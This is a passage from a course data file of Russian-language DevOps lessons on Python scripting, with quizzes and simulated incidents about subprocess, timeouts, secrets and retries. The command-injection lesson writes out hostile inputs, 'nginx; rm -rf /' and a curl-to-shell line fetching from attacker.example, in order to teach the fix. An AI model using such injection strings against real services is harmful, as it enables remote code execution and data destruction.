          "  result.returncode   # код возврата команды\n" +
          "  result.stdout       # её вывод\n",
      },
      {
        kind: "say",
        text:
          "Безопасность (спрашивают на собеседовании):\n\n" +
          '  ✗  subprocess.run(f"systemctl restart {name}", shell=True)\n' +
          '     если name = "nginx; rm -rf /" — выполнится и второе. Это инъекция команд.\n\n' +
          '  ✓  subprocess.run(["systemctl", "restart", name])\n' +
          "     аргументы передаются программе напрямую, shell не участвует.\n\n" +
          "Ещё:  check=True  — бросить исключение при ненулевом коде команды.",
      },
      {
        kind: "say",
        text:
          "ИСТОРИЯ ИЗ ЖИЗНИ. В компании был внутренний веб-сервис «перезапусти мой\n" +
          "сервис»: страничка с полем ввода, а под ней — python-бэкенд:\n\n" +
          '  name = request.form["service"]\n' +
          '  subprocess.run(f"systemctl restart {name}", shell=True)\n\n' +
          "Работало год. Потом стажёр на пентесте ввёл в поле:\n\n" +
          "  nginx; curl http://attacker.example/x.sh | sh\n\n" +
          "shell честно выполнил ОБЕ команды: перезапустил nginx и скачал-запустил\n" +
          "чужой скрипт от имени сервиса. Это называется инъекция команд (command\n" +
          "injection), и это одна из самых старых дыр на свете.\n\n" +
          "Лечится одной правкой:\n\n" +
          '  subprocess.run(["systemctl", "restart", name])\n\n' +
          "Без shell=True список уходит прямо в execve: имя программы — systemctl,\n" +
          "аргументы — «restart» и строка целиком, вместе с точкой с запятой. Никакой\n" +
          "shell её не разберёт, потому что shell тут вообще нет.",
      },
      {
        kind: "say",
        text:
          "Пример 1 — ПРОВЕРИТЬ состояние и решить по коду возврата:\n\n" +
          '  r = subprocess.run(["systemctl", "is-active", "nginx"],\n' +
          "                     capture_output=True, text=True)\n" +
          "  if r.returncode != 0:\n" +
          '      print("nginx лежит:", r.stdout.strip())\n' +
          "      sys.exit(1)\n\n" +
          "Тут  check=True  НЕ нужен: ненулевой код — это не авария скрипта, а ответ\n" +
          "на вопрос «жив ли сервис». Исключение здесь только мешало бы.",
      },
      {
        kind: "say",
        text:
          "Пример 2 — ЗАБРАТЬ вывод чужой команды и разобрать его:\n\n" +
          '  r = subprocess.run(["git", "rev-parse", "HEAD"],\n' +
          "                     capture_output=True, text=True, check=True)\n" +
          "  commit = r.stdout.strip()\n" +
          '  print("выкатываем коммит", commit[:8])\n\n' +
          "Здесь  check=True  как раз к месту: если git упал, продолжать деплой\n" +
          "бессмысленно — пусть летит CalledProcessError.\n\n" +
          "  text=True            — получить str, а не bytes (иначе будет b'abc\\n')\n" +
          "  capture_output=True  — забрать stdout/stderr себе, а не в консоль\n" +
          "  .strip()             — у вывода команд почти всегда хвостовой \\n",
      },
      {
        kind: "say",
        text:
          "Пример 3 — ДОЛГАЯ команда и таймаут. Правило из урока 14.5 про сеть\n" +
          "работает и здесь: внешняя команда тоже может зависнуть навсегда.\n\n" +
          "  try:\n" +
          '      r = subprocess.run(["ansible-playbook", "deploy.yml"],\n' +
          "                         capture_output=True, text=True,\n" +
          "                         timeout=600, check=True)\n" +
          "  except subprocess.TimeoutExpired:\n" +
          '      print("плейбук не уложился в 10 минут — убит по таймауту")\n' +
          "      sys.exit(1)\n" +
          "  except subprocess.CalledProcessError as e:\n" +
          '      print("плейбук упал, код", e.returncode)\n' +
          "      print(e.stderr)\n" +
          "      sys.exit(1)\n\n" +
          "Обрати внимание на  e.stderr : без него в логе будет только «код 2»,\n" +
          "а сама причина останется у тебя за спиной.",
      },
      {
        kind: "say",
        text:
          "ТИПИЧНАЯ ОШИБКА НОВИЧКА — передать список, но склеенной строкой:\n\n" +
          '  ✗  subprocess.run(["systemctl restart nginx"])\n' +
          "     FileNotFoundError: нет программы с именем «systemctl restart nginx».\n" +
          "     Список — это ОДИН элемент на аргумент, пробелы не разделители.\n\n" +
          '  ✓  subprocess.run(["systemctl", "restart", "nginx"])\n\n' +
          "Вторая ошибка — тянуться к shell=True ради конвейера:\n\n" +
          '  ✗  subprocess.run("ps aux | grep nginx", shell=True)\n\n' +
          "Конвейер, звёздочки, перенаправления — это возможности shell, и без него\n" +
          "их нет. Но в Python они почти всегда не нужны: список процессов, поиск\n" +
          "файлов и фильтрацию делают самим Python (модули os, glob, обычный if).\n" +
          "Если shell=True всё же неизбежен — внутрь не должно попадать НИ ОДНОГО\n" +
          "значения, пришедшего снаружи.",
      },
      {
        kind: "quiz",
        text: "Когда стоит ставить  check=True  в subprocess.run?",
        options: [
          "Когда ненулевой код команды означает аварию и продолжать нельзя (git rev-parse перед деплоем); для проверок вида is-active он лишний",
          "Всегда — без него subprocess.run не вернёт вывод",
          "Никогда, это устаревший аргумент",
        ],
        answer: 0,
        explain:
          "check=True превращает ненулевой код в CalledProcessError. Это уместно, когда провал команды = провал скрипта.",
      },
      {
        kind: "do",
        text:
          "Задача: создай  svc_state.py . Набери:\n" +
          "edit svc_state.py\n" +
          "subprocess.run со СПИСКОМ аргументов (systemctl is-active nginx), capture_output=True,\n" +
          "напечатай result.stdout, заверши кодом по result.returncode. Сохрани.",
        check: has(`${DIR}/svc_state.py`, /subprocess\.run\(\s*\n?\s*\[/),
        answer: SVC_OK,
        editFile: `${DIR}/svc_state.py`,
        hint: 'Первый аргумент subprocess.run — список:  ["systemctl", "is-active", "nginx"] , без shell=True.',
      },
      {
        kind: "do",
        text: "Задача: запусти —  python3 svc_state.py",
        check: ran(/^python3?\s+svc_state\.py/),
        answer: "python3 svc_state.py",
        hint: "Команда:  python3 svc_state.py",
      },
      {
        kind: "quiz",
        text: 'Чем опасен  subprocess.run(f"restart {name}", shell=True) ?',
        options: [
          "Инъекция команд: значение name с  ;  или  &&  выполнит произвольный shell-код. Нужен список аргументов без shell=True",
          "Ничем, это рекомендованный способ",
          "shell=True запрещён синтаксисом Python",
        ],
        answer: 0,
        explain:
          "shell=True + подстановка внешнего значения = дыра. Список аргументов передаётся программе напрямую.",
      },
    ],
  },
  {
    id: "14.9",
    act: 14,
    title: "Инцидент: ночной скрипт-экспортёр молча упал ⚡",
    xp: 45,
    intro: "Данных в дашборде нет сутки. Крон зелёный. Скрипт на Python. Разбираемся.",
    setup: (w) => {
      seedScripts(w);
      mkdirp(w, "/etc/app");
      writeFile(w, "/etc/app/config.json", CONFIG_JSON);
      writeFile(w, `${DIR}/export_metrics.py`, EXPORT_BROKEN);
      w.templates = { [`${DIR}/export_metrics.py`]: EXPORT_BROKEN };
    },
    steps: [
      {
        kind: "say",
        text:
          "Жалоба: «в дашборде метрик по проекту нет уже сутки». Метрики раз в 5 минут\n" +
          "выгружает крон-скрипт  export_metrics.py . В логе крона — пусто, задача\n" +
          "«отработала». Первым делом запускаем скрипт руками и смотрим, что он скажет.",
      },
      {
        kind: "do",
        text: "Шаг 1. Запусти скрипт вручную —  python3 export_metrics.py",
        check: ranAny(/^python3?\s+export_metrics\.py/),
        answer: "python3 export_metrics.py",
        hint: "Команда:  python3 export_metrics.py",
      },
      {
        kind: "say",
        text:
          "Видно сразу две вещи:\n\n" +
          "  ⚠  запрос без timeout=\n" +
          "  requests.exceptions.ConnectionError — исключение не поймано, скрипт упал\n\n" +
          "А адрес  http://metrics-nonexistent:9999/export  подозрительно похож на\n" +
          "заглушку. Открываем код.",
      },
      {
        kind: "do",
        text: "Шаг 2. Посмотри исходник —  cat export_metrics.py",
        check: ran(/^cat\s+export_metrics\.py/),
        answer: "cat export_metrics.py",
        hint: "Команда:  cat export_metrics.py",
      },
      {
        kind: "say",
        text:
          'В коде  # TODO: поменять на реальный адрес  и  url = "http://metrics-nonexistent:9999/...".\n' +
          "Placeholder уехал в прод. Плюс запрос без timeout и без обработки ошибки:\n" +
          "даже когда экспортёр просто тормозит, скрипт зависнет, а крон намолчит.\n\n" +
          "Чиним всё сразу: реальный адрес  http://localhost:9091/export , timeout,\n" +
          "try/except с  sys.exit(1) .",
      },
      {
        kind: "do",
        text:
          "Шаг 3. Почини  export_metrics.py . Набери:\n" +
          "edit export_metrics.py\n" +
          "Поставь реальный url (localhost:9091), добавь  timeout=5 , оберни в\n" +
          "try/except requests.RequestException с  sys.exit(1) . Сохрани.",
        check: (w) =>
          has(`${DIR}/export_metrics.py`, /timeout\s*=/)(w) &&
          has(`${DIR}/export_metrics.py`, /except\s+requests/)(w) &&
          !has(`${DIR}/export_metrics.py`, /nonexistent/)(w),
        answer: EXPORT_FIXED,
        editFile: `${DIR}/export_metrics.py`,
        hint: "Замени url на http://localhost:9091/export, добавь timeout=5 и блок try/except requests.RequestException.",
      },
      {
        kind: "do",
        text: "Шаг 4. Запусти снова —  python3 export_metrics.py . Теперь должно быть зелено.",
        check: ran(/^python3?\s+export_metrics\.py/),
        answer: "python3 export_metrics.py",
        hint: "Команда:  python3 export_metrics.py  — конфиг прочитан, GET 200 OK, код 0.",
      },
      {
        kind: "say",
        text:
          "Инцидент закрыт. Три вывода, каждый — типовой вопрос на собеседовании:\n\n" +
          "  1) любой сетевой вызов — с  timeout= , иначе однажды всё зависнет\n" +
          "  2) ошибку не глотать: понятный лог + выход не-нулевым кодом\n" +
          "  3) крон-скрипт без проверки результата = «тихий сбой» (как в Акте 3).\n" +
          "     Нужен алерт «нет свежих данных за N минут», а не надежда на логи.",
      },
    ],
  },
  {
    id: "14.10",
    act: 14,
    title: "Качество и упаковка: ruff, requirements.txt",
    xp: 20,
    intro: "Линтер ловит ошибки до запуска, requirements.txt фиксирует версии для воспроизводимости.",
    setup: seedScripts,
    steps: [
      {
        kind: "say",
        text:
          "Линтер и форматтер — обязательная гигиена:\n\n" +
          "  ruff check .     — находит баги, неиспользуемые импорты, стиль (быстрый,\n" +
          "                     заменяет flake8 + isort + часть pylint)\n" +
          "  ruff format .    — единое форматирование (аналог black / gofmt)\n\n" +
          "Их ставят в dev-зависимости и гоняют в CI — красный линтер не пускает merge.",
      },
      {
        kind: "say",
        text:
          "Зависимости фиксируют в  requirements.txt :\n\n" +
          "  requests==2.31.0\n" +
          "  pyyaml==6.0.1\n\n" +
          "Точные версии (==), а не  requests  без числа — иначе «у меня работает, у\n" +
          "тебя нет». Это тот же принцип, что фиксированные теги образов в Акте 6 и\n" +
          "lock-файл в IaC. Генерируют командой  pip freeze > requirements.txt ,\n" +
          "ставят —  pip install -r requirements.txt .",
      },
      {
        kind: "do",
        text: "Задача: поставь  ruff  и выведи список версий для requirements.txt —  pip freeze",
        check: ran(/^pip3?\s+freeze/),
        answer: "pip install ruff\npip freeze",
        hint: "Сначала  pip install ruff , потом  pip freeze .",
      },
      {
        kind: "say",
        text:
          "Минимум для любого python-репозитория в DevOps:\n\n" +
          "  • venv + requirements.txt с точными версиями\n" +
          "  • ruff check в CI\n" +
          '  • if __name__ == "__main__"  и явные коды возврата\n' +
          "  • сетевые вызовы с timeout, ошибки — в лог\n\n" +
          "Этого хватает, чтобы скрипт можно было отдать коллеге и в прод.",
      },
      {
        kind: "quiz",
        text: "Зачем в requirements.txt фиксируют точные версии ( requests==2.31.0 )?",
        options: [
          "Воспроизводимость: у всех и в CI одинаковые версии, поведение не «плавает» между машинами",
          "Так пакеты ставятся быстрее",
          "Без версии pip выдаёт ошибку",
        ],
        answer: 0,
        explain:
          "Та же идея, что фикс-теги образов (Акт 6) и lock-файлы в IaC (Акт 8): убрать «у меня работает».",
      },
    ],
  },
  {
    id: "14.11",
    act: 14,
    title: "Python и bash: что чем",
    xp: 20,
    intro: "Не спор «что лучше», а понимание границы: где заканчивается bash и начинается Python.",
    steps: [
      {
        kind: "say",
        text:
          "Собери картину из двух актов про скрипты (3 и 14):\n\n" +
          "  bash    — склеить несколько команд, конвейеры, разовый запуск, 5–15 строк.\n" +
          "            Пример: сделать архив, залить в хранилище, удалить старые.\n\n" +
          "  Python  — логика, данные (JSON/YAML/API), обработка ошибок, повторное\n" +
          "            использование, тесты, скрипт большой и общий.",
      },
      {
        kind: "say",
        text:
          "Признаки, что пора переписывать bash-скрипт на Python:\n\n" +
          "  • появились вложенные if / case и их стало трудно читать\n" +
          "  • разбираешь вывод команд через sed/awk в несколько этажей\n" +
          "  • ходишь в HTTP API, обрабатываешь коды ответа\n" +
          "  • нужен --help, аргументы, понятные ошибки\n" +
          "  • скрипт перевалил за 30–50 строк и его правят несколько человек",
      },
      {
        kind: "say",
        text:
          "Что общего у хороших скриптов на любом языке:\n\n" +
          "  • явные коды возврата (0 / не 0)\n" +
          "  • останавливаться на ошибке (set -e в bash / исключения в Python)\n" +
          "  • никаких секретов в коде — только переменные окружения / хранилище\n" +
          "  • результат мониторится (крон без алерта на сбой бесполезен)\n\n" +
          "Инструмент разный — принципы из Актов 3, 7 и 14 одни.",
      },
      {
        kind: "quiz",
        text: "bash-скрипт разросся: 15 строк, два вложенных цикла и разбор JSON через grep. Что разумно сделать?",
        options: [
          "Переписать на Python: json + requests + argparse; в bash это уже хрупко и нечитаемо",
          "Оставить как есть — работает же",
          "Разбить на пять bash-скриптов поменьше",
        ],
        answer: 0,
        explain:
          "Разбор JSON и вложенная логика — явный сигнал перейти на Python. Дробить bash проблему не решит.",
      },
    ],
  },
  {
    id: "14.12",
    act: 14,
    title: "Проверка: собери healthcheck-CLI",
    xp: 40,
    intro: "От пустого окружения до рабочего инструмента: аргументы, timeout, осмысленный код возврата.",
    setup: (w) => {
      seedBare(w);
      w.templates = {
        [`${DIR}/monitor.py`]:
          "# ЗАДАЧА: CLI-проверка сервиса.\n" +
          "#  argparse: обязательный --url, необязательный --timeout (int, default 5)\n" +
          "#  requests.get(args.url, timeout=args.timeout) + raise_for_status()\n" +
          "#  except requests.RequestException -> print + sys.exit(1)\n" +
          "#  успех -> print(r.status_code) + sys.exit(0). Комментарий сотри.\n",
      };
    },
    steps: [
      {
        kind: "say",
        text:
          "Финал курса. Собери сам инструмент  monitor.py : проверяет здоровье сервиса\n" +
          "по URL из аргумента, с таймаутом, с понятным кодом возврата (0 — жив, 1 — нет).\n" +
          "Ошибёшься — подсказка, ещё раз — готовый ответ.",
      },
      {
        kind: "do",
        text: "Шаг 1. Подготовь окружение: создай venv и поставь requests.",
        check: (w) => !!w.py?.venv && !!w.py?.pkgs.includes("requests"),
        answer: "python3 -m venv .venv\npip install requests",
        hint: "Две команды:  python3 -m venv .venv  и  pip install requests .",
      },
      {
        kind: "do",
        text:
          "Шаг 2. Напиши  monitor.py . Набери:\n" +
          "edit monitor.py\n" +
          "argparse с обязательным  --url  и  --timeout (int, default 5); requests.get(args.url,\n" +
          "timeout=args.timeout) + raise_for_status(); except requests.RequestException ->\n" +
          "print + sys.exit(1); успех -> print(r.status_code) + sys.exit(0). Сохрани.",
        check: (w) =>
          has(`${DIR}/monitor.py`, /add_argument\(\s*["']--url["'][^\n]*required\s*=\s*True/)(w) &&
          has(`${DIR}/monitor.py`, /timeout\s*=/)(w) &&
          has(`${DIR}/monitor.py`, /except\s+requests/)(w),
        answer: MONITOR_OK,
        editFile: `${DIR}/monitor.py`,
        hint: 'Нужны: add_argument("--url", required=True), requests.get(args.url, timeout=args.timeout), try/except requests.RequestException с sys.exit(1).',
      },
      {
        kind: "do",
        text: "Шаг 3. Запусти инструмент —  python3 monitor.py --url http://localhost:8080/health",
        check: ran(/^python3?\s+monitor\.py\s+--url\s+\S+/),
        answer: "python3 monitor.py --url http://localhost:8080/health",
        hint: "Команда:  python3 monitor.py --url http://localhost:8080/health",
      },
      {
        kind: "say",
        text:
          "Хороший рубеж — рабочий CLI-инструмент готов. Это база. Дальше в этом же\n" +
          "акте — то, что отличает скрипт для собеседования от скрипта для прода:\n" +
          "секреты через переменные окружения, повтор с паузой при сетевых сбоях,\n" +
          "логи вместо print и инцидент с утёкшим в git токеном.",
      },
    ],
  },
  {
    id: "14.13",
    act: 14,
    title: "Секреты не в коде: os.environ",
    xp: 40,
    intro: "Токен, пароль или ключ API никогда не пишут прямо в .py файле.",
    setup: (w) => {
      seedScripts(w);
      w.templates = {
        [`${DIR}/notify.py`]:
          "# ЗАДАЧА: прочитай токен из переменной окружения API_TOKEN через os.environ,\n" +
          "# напечатай первые 4 символа. Комментарий сотри.\n",
      };
    },
    steps: [
      {
        kind: "say",
        text:
          "Ты уже видел переменные окружения в Акте 1 ( export , env ). В Python их\n" +
          "читают модулем  os :\n\n" +
          '  import os\n  token = os.environ["API_TOKEN"]     # KeyError, если переменной нет\n' +
          '  level = os.environ.get("LOG_LEVEL", "info")  # безопасно, есть значение по умолчанию\n',
      },
      {
        kind: "say",
        text:
          "Почему не хранить токен строкой в коде:\n\n" +
          '  ✗  TOKEN = "sk-abc123..."     — попадёт в git, увидят все, у кого есть доступ к репо\n' +
          '  ✓  TOKEN = os.environ["API_TOKEN"]  — значение живёт вне кода: в CI-секретах,\n' +
          "     .env-файле (который в .gitignore) или хранилище секретов\n\n" +
          "Тот же принцип, что переменные CI_TOKEN в Акте 7 и env-переменные Docker в Акте 6.",
      },
      {
        kind: "say",
        text:
          "ИСТОРИЯ ИЗ ЖИЗНИ. Разработчик выложил учебный проект на GitHub — в коде\n" +
          "лежал ключ от облачного аккаунта, «временный, потом уберу». Боты, которые\n" +
          "круглосуточно сканируют публичные репозитории на строки вида  AKIA... ,\n" +
          "нашли ключ примерно через 4 минуты после пуша.\n\n" +
          "К утру в аккаунте крутилось несколько десятков виртуалок, майнящих крипту.\n" +
          "Счёт за ночь — больше, чем зарплата. Репозиторий был публичным всего\n" +
          "полдня, и удаление файла уже ничего не решало: ключ утёк в ту же минуту,\n" +
          "когда попал в git.\n\n" +
          "Отсюда железное правило: секрет, попавший в git, считается\n" +
          "скомпрометированным НАВСЕГДА. Не «надо подчистить», а «надо отозвать».",
      },
      {
        kind: "say",
        text:
          "Откуда переменная окружения берётся на практике — три разных способа:\n\n" +
          "1) ЛОКАЛЬНО, когда работаешь руками:\n" +
          "     export API_TOKEN=abc123\n" +
          "     python3 notify.py\n" +
          "   Живёт только в этой сессии терминала (Акт 1).\n\n" +
          "2) В CI (Акт 7): секрет лежит в настройках проекта, раннер подставляет его\n" +
          "   в окружение шага. В коде пайплайна — только имя, не значение.\n\n" +
          "3) В КОНТЕЙНЕРЕ (Акт 6):  docker run -e API_TOKEN=... , а в Kubernetes\n" +
          "   (Акт 9) — Secret, подключённый к поду через env.\n\n" +
          "Во всех трёх случаях сам python-код НЕ МЕНЯЕТСЯ: он просто читает\n" +
          'os.environ["API_TOKEN"] . В этом вся красота — один скрипт работает\n' +
          "и на ноутбуке, и в CI, и в кластере.",
      },
      {
        kind: "say",
        text:
          "Четвёртый способ — файл  .env  для локальной разработки:\n\n" +
          "  # .env\n" +
          "  API_TOKEN=local-dev-token\n" +
          "  LOG_LEVEL=debug\n\n" +
          "Его читают библиотекой python-dotenv:\n\n" +
          "  from dotenv import load_dotenv\n" +
          "  load_dotenv()                      # подгрузит .env в os.environ\n" +
          '  token = os.environ["API_TOKEN"]\n\n' +
          "И тут же — САМОЕ ВАЖНОЕ про .env:\n\n" +
          '  echo ".env" >> .gitignore\n\n' +
          "Файл .env НИКОГДА не коммитят. Вместо него в репозиторий кладут  .env.example \n" +
          "с теми же именами и пустыми значениями — чтобы коллега увидел, какие\n" +
          "переменные вообще нужны. Половина утечек в мире — это забытый .gitignore.",
      },
      {
        kind: "say",
        text:
          "ТИПИЧНАЯ ОШИБКА НОВИЧКА — напечатать секрет в лог:\n\n" +
          '  ✗  print("использую токен:", token)\n' +
          '  ✗  logger.debug("заголовки: %s", headers)   # а там Authorization\n\n' +
          "Лог уезжает в общий сборщик, к которому доступ у половины компании, и\n" +
          "хранится годами. Секрет из кода ты убрал, а в логах он теперь есть.\n\n" +
          "Если очень нужно убедиться, что токен вообще подставился, — печатай\n" +
          "маску, а не значение:\n\n" +
          '  print("токен загружен, длина", len(token), "начинается на", token[:4])\n\n' +
          "Вторая ошибка — перепутать, что секретно. URL внутреннего сервиса или\n" +
          "имя базы — это конфигурация, их прятать не нужно. Токены, пароли,\n" +
          "приватные ключи и строки подключения с паролем внутри — секреты.",
      },
      {
        kind: "quiz",
        text: "Токен случайно закоммитили в публичный репозиторий. Какое действие ПЕРВОЕ?",
        options: [
          "Отозвать и перевыпустить токен на стороне сервиса — он утёк в момент пуша, и чистка истории этого не отменяет",
          "Удалить строку из файла и сделать новый коммит — этого достаточно",
          "Сделать репозиторий приватным и ничего больше не трогать",
        ],
        answer: 0,
        explain:
          "Публичный секрет считается скомпрометированным навсегда: боты сканируют пуши за минуты. Ротация — первым делом, чистка кода — вторым.",
      },
      {
        kind: "quiz",
        text: "Зачем в репозиторий кладут  .env.example , если сам  .env  коммитить нельзя?",
        options: [
          "Чтобы коллега и CI видели список нужных переменных (имена без значений) и могли собрать своё окружение",
          "Чтобы хранить там же настоящие значения, но под другим именем",
          "Это требование pip, без него зависимости не поставятся",
        ],
        answer: 0,
        explain:
          ".env.example — документация окружения: имена есть, значений нет. Настоящий .env всегда в .gitignore.",
      },
      {
        kind: "do",
        text:
          "Задача: создай  notify.py . Набери:\n" +
          "edit notify.py\n" +
          'Прочитай  os.environ["API_TOKEN"]  и напечатай значение. Сохрани.',
        check: has(`${DIR}/notify.py`, /os\.environ\[\s*["']API_TOKEN["']\s*\]/),
        answer:
          '#!/usr/bin/env python3\nimport os\n\ntoken = os.environ["API_TOKEN"]\nprint("токен:", token)\n',
        editFile: `${DIR}/notify.py`,
        hint: 'В edit notify.py: import os, затем  token = os.environ["API_TOKEN"] , затем print(token).',
      },
      {
        kind: "do",
        text: "Задача: запусти без переменной — увидишь KeyError. Команда:  python3 notify.py",
        check: (w) => w.log.some((l) => /^python3?\s+notify\.py/.test(l.cmd) && l.code !== 0),
        answer: "python3 notify.py",
        hint: "Команда:  python3 notify.py  — переменной нет, ждём KeyError.",
      },
      {
        kind: "do",
        text: "Задача: задай переменную окружения и запусти снова.",
        check: (w) => w.log.some((l) => /^python3?\s+notify\.py/.test(l.cmd) && l.code === 0),
        answer: "export API_TOKEN=demo-token\npython3 notify.py",
        hint: "Сначала  export API_TOKEN=demo-token , потом  python3 notify.py",
      },
      {
        kind: "quiz",
        text: "Почему секрет читают через os.environ, а не пишут строкой в коде?",
        options: [
          "Код попадает в git и его видят все с доступом к репо; секрет должен жить вне кода",
          "os.environ работает быстрее, чем обычная переменная",
          "Python не разрешает присваивать строки напрямую переменным",
        ],
        answer: 0,
        explain:
          "Тот же принцип, что CI-секреты (Акт 7) и -e в docker run (Акт 6): секрет — не в исходниках.",
      },
    ],
  },
  {
    id: "14.14",
    act: 14,
    title: "os.environ.get: значение по умолчанию",
    xp: 20,
    intro: "Не для всякой переменной нужен обязательный KeyError — иногда достаточно разумного default.",
    setup: seedScripts,
    steps: [
      {
        kind: "say",
        text:
          "Не все переменные окружения одинаково критичны:\n\n" +
          '  os.environ["API_TOKEN"]                 — без токена работать бессмысленно, пусть упадёт\n' +
          '  os.environ.get("LOG_LEVEL", "info")     — не задали уровень логов? не страшно, дефолт "info"\n\n' +
          "Правило: обязательные секреты/адреса — через [], необязательные настройки — через .get().",
      },
      {
        kind: "do",
        text:
          "Задача: создай  settings.py . Набери:\n" +
          "edit settings.py\n" +
          'Прочитай LOG_LEVEL через os.environ.get с дефолтом "info" и напечатай его.',
        check: has(`${DIR}/settings.py`, /os\.environ\.get\(\s*["']LOG_LEVEL["']/),
        answer:
          '#!/usr/bin/env python3\nimport os\n\nlevel = os.environ.get("LOG_LEVEL", "info")\nprint("уровень логов:", level)\n',
        editFile: `${DIR}/settings.py`,
        hint: 'os.environ.get("LOG_LEVEL", "info") — вторым аргументом идёт значение по умолчанию.',
      },
      {
        kind: "do",
        text: "Задача: запусти без переменной — должно вывести дефолтное значение, без ошибки.",
        check: ran(/^python3?\s+settings\.py/),
        answer: "python3 settings.py",
        hint: "Команда:  python3 settings.py",
      },
      {
        kind: "quiz",
        text: 'Когда стоит использовать os.environ.get("X", default) вместо os.environ["X"]?',
        options: [
          "Когда без переменной скрипт всё ещё может разумно работать — например, необязательные настройки",
          "Всегда, os.environ[] считается устаревшим",
          "Только для чисел, для строк не подходит",
        ],
        answer: 0,
        explain:
          "Обязательное — падает явно ([]). Необязательное — получает дефолт (.get()). Выбор осознанный.",
      },
    ],
  },
  {
    id: "14.15",
    act: 14,
    title: "Инцидент: токен в git-истории ⚡",
    xp: 45,
    intro: "Секьюрити-скан нашёл токен в коммите трёхмесячной давности. Реагируем.",
    setup: (w) => {
      seedScripts(w);
      writeFile(
        w,
        `${DIR}/notify.py`,
        '#!/usr/bin/env python3\nimport requests\n\nTOKEN = "sk-live-9f8a7b6c5d4e"\nrequests.post("https://hooks.example.com/notify", headers={"Authorization": TOKEN}, timeout=5)\n',
      );
      w.templates = {
        [`${DIR}/notify.py`]:
          '#!/usr/bin/env python3\nimport requests\n\n# TODO: убрать хардкод токена, взять из окружения\nTOKEN = "sk-live-9f8a7b6c5d4e"\nrequests.post("https://hooks.example.com/notify", headers={"Authorization": TOKEN}, timeout=5)\n',
      };
    },
    steps: [
      {
        kind: "say",
        text:
          "Жалоба от security-команды: «в файле notify.py в git найден настоящий\n" +
          "рабочий токен, лежит там три месяца — сколько людей его уже видели,\n" +
          "неизвестно». Смотрим код.",
      },
      {
        kind: "do",
        text: "Шаг 1. Посмотри исходник —  cat notify.py",
        check: ran(/^cat\s+notify\.py/),
        answer: "cat notify.py",
        hint: "Команда:  cat notify.py",
      },
      {
        kind: "say",
        text:
          'Строка  TOKEN = "sk-live-..."  — секрет прямо в коде, попал в git. Мало\n' +
          "убрать строку из будущей версии: старый коммит с токеном всё ещё в истории,\n" +
          "и токен придётся считать скомпрометированным навсегда.\n\n" +
          "Порядок действий при утечке секрета (спрашивают на собеседовании):\n\n" +
          "  1) немедленно ОТОЗВАТЬ/перевыпустить сам токен на стороне сервиса —\n" +
          "     переписывание git-истории эту утечку не отменяет\n" +
          "  2) убрать секрет из кода, читать из окружения\n" +
          "  3) при необходимости почистить историю git (отдельная операция,\n" +
          "     сама по себе секрет не аннулирует)",
      },
      {
        kind: "do",
        text:
          "Шаг 2. Почини код. Набери:\n" +
          "edit notify.py\n" +
          'Убери хардкод, читай токен через  os.environ["API_TOKEN"] . Сохрани.',
        check: (w) =>
          has(`${DIR}/notify.py`, /os\.environ\[\s*["']API_TOKEN["']\s*\]/)(w) &&
          !has(`${DIR}/notify.py`, /sk-live/)(w),
        answer:
          '#!/usr/bin/env python3\nimport os\nimport requests\n\nTOKEN = os.environ["API_TOKEN"]\nrequests.post("https://hooks.example.com/notify", headers={"Authorization": TOKEN}, timeout=5)\n',
        editFile: `${DIR}/notify.py`,
        hint: 'Замени TOKEN = "sk-live-..." на  TOKEN = os.environ["API_TOKEN"]  и import requests не трогай.',
      },
      {
        kind: "do",
        text: "Шаг 3. Задай переменную окружения и убедись, что скрипт работает без хардкода.",
        check: (w) => w.log.some((l) => /^python3?\s+notify\.py/.test(l.cmd) && l.code === 0),
        answer: "export API_TOKEN=new-rotated-token\npython3 notify.py",
        hint: "Сначала  export API_TOKEN=new-rotated-token , потом  python3 notify.py",
      },
      {
        kind: "say",
        text:
          "Инцидент закрыт с оговоркой: код исправлен, но реальный токен в проде\n" +
          "обязаны перевыпустить отдельно — это ответственность владельца сервиса,\n" +
          "а не результат правки одного файла.",
      },
    ],
  },
  {
    id: "14.16",
    act: 14,
    title: "Повтор с паузой: retry вместо мгновенного отказа",
    xp: 45,
    intro: "Сеть иногда моргает на секунду — падать с первой же попытки не всегда правильно.",
    setup: (w) => {
      seedScripts(w);
      w.templates = {
        [`${DIR}/notify_retry.py`]:
          "# ЗАДАЧА: 3 попытки в цикле for с time.sleep(2) между ними,\n" +
          "# GET http://metrics-nonexistent:9999/export с timeout=5. Комментарий сотри.\n",
      };
    },
    steps: [
      {
        kind: "say",
        text:
          "requests.RequestException — это не всегда «сервис умер навсегда». Иногда\n" +
          "сеть моргнула на секунду или сервис перезапускается. Разумная реакция —\n" +
          "повторить попытку с паузой, а не сразу сдаваться:\n\n" +
          "  import time\n" +
          "  for attempt in range(3):\n" +
          "      try:\n" +
          "          r = requests.get(url, timeout=5)\n" +
          "          r.raise_for_status()\n" +
          "          break\n" +
          "      except requests.RequestException:\n" +
          '          print("попытка", attempt + 1, "не удалась, ждём")\n' +
          "          time.sleep(2)\n",
      },
      {
        kind: "say",
        text:
          "Важно не переусердствовать:\n\n" +
          "  • у retry должен быть ПОТОЛОК (3-5 попыток) — иначе это не retry, а завис\n" +
          "  • пауза между попытками (иначе это DDoS собственного сервиса)\n" +
          "  • если все попытки провалились — та же обязательная обработка ошибки:\n" +
          '    понятный лог и sys.exit(1), а не тихое "само пройдёт"',
      },
      {
        kind: "say",
        text:
          "ИСТОРИЯ ИЗ ЖИЗНИ — и это история про retry, который сделал ХУЖЕ.\n\n" +
          "У сервиса авторизации случился всплеск нагрузки, часть запросов начала\n" +
          "отваливаться по таймауту. Клиентские скрипты (их было около двухсот)\n" +
          "дружно начали ретраить — сразу, без паузы, в бесконечном while.\n\n" +
          "Сервис, который просто притормаживал, получил в несколько раз больше\n" +
          "запросов, чем обычно, и лёг совсем. Скрипты ретраили ещё активнее. Поднять\n" +
          "сервис не удавалось: как только он вставал, его тут же заваливало\n" +
          "накопившимися повторами.\n\n" +
          "Это называется «шторм повторов» (retry storm), и лечится он двумя вещами:\n" +
          "потолком попыток и РАСТУЩЕЙ паузой между ними.",
      },
      {
        kind: "say",
        text:
          "Пример 1 — ЭКСПОНЕНЦИАЛЬНАЯ задержка (exponential backoff). Пауза не\n" +
          "фиксированная, а удваивается: 1с, 2с, 4с, 8с.\n\n" +
          "  for attempt in range(5):\n" +
          "      try:\n" +
          "          r = requests.get(url, timeout=5)\n" +
          "          r.raise_for_status()\n" +
          "          break\n" +
          "      except requests.RequestException as e:\n" +
          "          delay = 2 ** attempt        # 1, 2, 4, 8, 16\n" +
          '          print(f"попытка {attempt + 1} не удалась ({e}), ждём {delay}с")\n' +
